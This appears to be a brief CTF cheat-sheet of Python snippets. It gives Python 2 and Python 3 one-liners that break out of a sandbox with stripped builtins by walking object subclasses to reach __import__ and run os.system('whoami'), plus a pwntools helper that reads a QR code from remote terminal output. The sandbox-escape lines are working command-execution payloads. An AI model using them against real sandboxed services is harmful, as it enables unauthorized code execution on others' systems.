# Python

### Bypass python builtins none

#### Python2

```python
().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('whoami')
```

#### Python3

```python
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('whoami')
```

### QRCode from Terminal Output

```python
#!/usr/bin/env python2
from pwn import *
from subprocess import check_output
import subprocess

p = remote('host',1234)
img = p.recvuntil("[+]")
print(img)
subprocess.call("gnome-screenshot -f x.png", shell=True)
output = subprocess.check_output("zbarimg x.png ", shell=True)
print(output)
p.interactive()
```

